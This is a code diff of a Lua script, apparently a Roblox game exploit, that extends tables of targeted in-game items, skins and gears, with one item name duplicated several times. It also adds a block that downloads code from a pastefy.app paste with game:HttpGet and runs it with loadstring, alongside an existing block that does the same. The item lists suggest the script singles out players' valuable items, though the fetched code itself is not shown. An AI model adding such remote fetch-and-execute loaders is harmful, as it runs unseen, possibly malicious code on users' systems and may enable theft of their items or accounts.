@@ -128,6 +128,17 @@ local TargetBrainrots = {
     ["La Fuse Machine"] = true,
     ["Nachorilla"] = true,
     ["Sammyni Truckini"] = true,
+    ["Cabin Bros"] = true,
+    ["Sammyni Truckini"] = true,
+    ["Sammyni Bros"] = true,
+    ["Scorpi Bros"] = true,
+    ["Tic bris"] = true,
+    ["Nacho Bros"] = true,
+    ["Tang Bros"] = true,
+    ["Spinny Bros"] = true,
+    ["Noobini Bros"] = true,
+    ["Scary Bros"] = true,
+    ["Sammyni Truckini"] = true,
     ["Scorpino Coasterino"] = true
 }
 
@@ -154,6 +165,7 @@ local TargetBaseSkins = {
     ["Rose"] = true,
     ["Summer"] = true,
     ["Taco"] = true,
+    ["Reaper"] = true,
     ["Valentines"] = true,
     ["Yin Yang"] = true,
     ["Tralalero"] = true
@@ -180,11 +192,16 @@ local TargetGears = {
     ["Santa's Sleigh"] = true,
     ["Waverider"] = true,
     ["Witch's Broom"] = true,
+    ["Skeleton Dragon"] = true,
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
     ["Crystal Slap"] = true
 }
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+end)
 
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/GNGi4J0A/raw"))()
